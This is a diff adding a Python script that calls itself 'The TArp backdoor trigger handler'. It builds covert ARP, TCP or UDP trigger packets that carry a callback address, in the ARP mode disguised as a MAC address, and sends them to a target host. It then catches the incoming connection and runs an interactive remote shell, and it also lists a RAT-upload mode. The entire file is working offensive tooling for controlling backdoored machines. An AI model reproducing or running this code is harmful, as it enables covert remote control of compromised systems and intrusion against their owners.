@@ -1,0 +1,208 @@
+#!/usr/bin/python
+# -*- coding: utf-8 -*-
+import socket
+import struct
+import netaddr
+import sys
+import select
+import argparse
+import netifaces
+from scapy.all import *
+    
+# Acquire local address (hopefully not picking the loopback address)
+local_addresses = []
+for interface in netifaces.interfaces():
+    local_addresses.append(netifaces.ifaddresses(interface)[netifaces.AF_INET][0]['addr'])
+
+local_ip = local_addresses[-1]
+
+banner = "" +\
+u"                    ██╗ ██████╗ ███████╗ ██╗\n" +\
+u"                    ██║██╔════╝ ██╔════╝ ██║\n" +\
+u"                    ██║██║  ███╗███████╗ ██║\n" +\
+u"               ██   ██║██║   ██║╚════██║ ██║\n" +\
+u"               ╚█████╔╝╚██████╔╝███████║ ██║\n" +\
+u"                ╚════╝  ╚═════╝ ╚══════╝ ╚═╝\n" 
+
+# Verify if provided IP Address is valid
+def parse_ip(ipaddr):
+    if not netaddr.valid_ipv4(ipaddr):
+        msg = "Not a valid IP address (%s)" % ipaddr
+        raise argparse.ArgumentTypeError(msg)
+    return ipaddr
+
+# Define parser arguments
+parser = argparse.ArgumentParser(formatter_class=argparse.RawDescriptionHelpFormatter,
+        description = banner + "The TArp backdoor trigger handler." +\
+        " Builds the ARP, TCP, or UDP trigger\n packet and handles the specified callback.")
+
+parser.add_argument("-t", default="tcp", metavar="arp|tcp|udp", dest="t_type",
+        choices=["arp","tcp","udp"], type=str.lower,
+        help="Specify the trigger type. (default: tcp)")
+
+parser.add_argument("-c", default=local_ip ,type=parse_ip, metavar="<IP>", dest="c_addr",
+        help="Callback IP Address. (default: %s)" % local_ip)
+
+parser.add_argument("-p", default=8055, type=int, choices=range(1,65535),
+        metavar='', dest="c_port",
+        help="Callback Port number. (default: 8055)")
+
+parser.add_argument("-s", default=local_ip,
+        type=parse_ip, metavar="SOURCE", dest="source",
+        help="Source Address for trigger packet. (default: %s)" % local_ip)
+
+parser.add_argument("-m", default="shell", metavar="MODE", dest="mode",
+        help="Mode type. Either shell callback or RAT upload. (default: shell)")
+
+
+parser.add_argument("target", type=parse_ip, metavar="TARGET",
+        help="Target IP Address.")
+
+def display_trigger(p,args):
+    '''
+    Displays the created trigger that will be sent to the target
+    for verification of details prior to firing.
+    Receives packet(p) and the full args object.
+    '''
+
+    if args.t_type == 'tcp' or args.t_type == 'udp':
+
+        print "\nPreparing to send a trigger packet with the folowing details...\n"
+        print "========IP Header======"
+        print "Source: %s" % p.src
+        print "Dest  : %s" % p.dst
+        print "=======%s Header======" % args.t_type.upper()
+        print "SPort : %s" % p.sport
+        print "DPort : %s" % p.dport
+        print "=====Callback Data====="
+        print "IP    : %s" % args.c_addr
+        print "Port  : %s" % args.c_port
+        print "======================="
+
+        while True:
+            resp = raw_input("\nReady to send it? ").lower()
+            if resp == "yes" or resp == "y":
+                break
+            elif resp == "no" or resp == "n":
+                print "Not gonna send it..."
+                sys.exit()
+    else:
+
+        print "\nPreparing to send a trigger packet with the folowing details...\n"
+        print "=======ARP Header======"
+        print "HwDst  : %s" % p.hwdst
+        print "HwSrc  : %s" % ":".join(p.hwsrc)
+        print "=====Callback Data====="
+        print "IP    : %s" % args.c_addr
+        print "Port  : %s" % args.c_port
+        print "======================="
+        
+        while True:
+            resp = raw_input("\nReady to send it? ").lower()
+            if resp == "yes" or resp == "y":
+                break
+            elif resp == "no" or resp == "n":
+                print "Not gonna send it..."
+                sys.exit()
+
+def handle_shell(callback, c_info):
+    while True:
+
+        sock_list = [sys.stdin,callback]
+        read_sockets, write_socket, error_socket = select(sock_list,[],[])
+
+        for sock in read_sockets:
+            if sock == callback:
+                data = b""
+                buffer = 1024
+                while True:
+                    message = sock.recv(buffer)
+                    data += message
+                    if message[-1] == "\n":
+                        break
+                sys.stdout.write("\n" + data + "%s>" % c_info[0])
+                sys.stdout.flush()
+            else:
+                message = sys.stdin.readline().strip()
+                if message.strip() == "exit":
+                    break
+                else:
+                    callback.send(message + '\n')
+                    sys.stdout.write("%s>" % c_info[0])
+                    sys.stdout.flush()
+
+        if message == "exit":
+            break
+
+def main():
+
+    # Parse commandline arguments
+    args = parser.parse_args()
+
+
+    if args.t_type == "tcp":
+
+        ip_layer = IP(dst=args.target)
+        tcp_layer = TCP(dport=22,sport=45555)
+        callback = Raw(load=struct.pack("!H",args.c_port))/Raw(load=netaddr.IPAddress(args.c_addr).packed)
+        trigger = ip_layer/tcp_layer/callback
+        
+        display_trigger(trigger,args)
+
+    elif args.t_type == "udp":
+
+        ip_layer = IP(dst=args.target)
+        udp_layer = UDP(dport=123,sport=45555)
+        callback = Raw(load=struct.pack("!H",args.c_port))/Raw(load=netaddr.IPAddress(args.c_addr).packed)
+        trigger = ip_layer/udp_layer/callback
+
+        display_trigger(trigger,args)
+
+    elif args.t_type == "arp":
+
+        # build hwsrc field to hide the callback address and port as a pseudo mac address
+        callback = []
+        callback.append(format(args.c_port,'x')[0:2])
+        callback.append(format(args.c_port,'x')[2:])
+ 
+        for octet in netaddr.IPAddress(args.c_addr).words:
+            callback.append(format(octet,'x'))
+ 
+        trigger = ARP(pdst = args.target, hwdst = "ff:fe:ff:ff:fe:ff", hwsrc = callback)
+
+        display_trigger(trigger,args)
+
+    if args.c_addr in local_addresses:
+
+        print "[*] Preparing listener."
+
+        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        try:
+            s.bind((args.c_addr,args.c_port))
+            s.listen(1)
+        except:
+            print "[!] Failed to bind listener"
+
+        print "[*] Ready to receive callback. Sending trigger!"
+        send(trigger)
+        
+        print "[*] Waiting for callback....."
+        callback, c_info = s.accept()
+        print "[!] Received connection from %s" % c_info[0]
+
+        if args.mode == "shell":
+            sys.stdout.write("%s>" % c_info[0])
+            sys.stdout.flush()
+            handle_shell(callback, c_info)
+
+    else:
+
+        print "\n[!] Callback address does not appear to be on this box.\n Ensure a " +\
+                "listener is ready.\n"
+        raw_input("Press [ENTER] to continue....")
+        send(trigger)
+
+
+if __name__ == "__main__":
+    main()
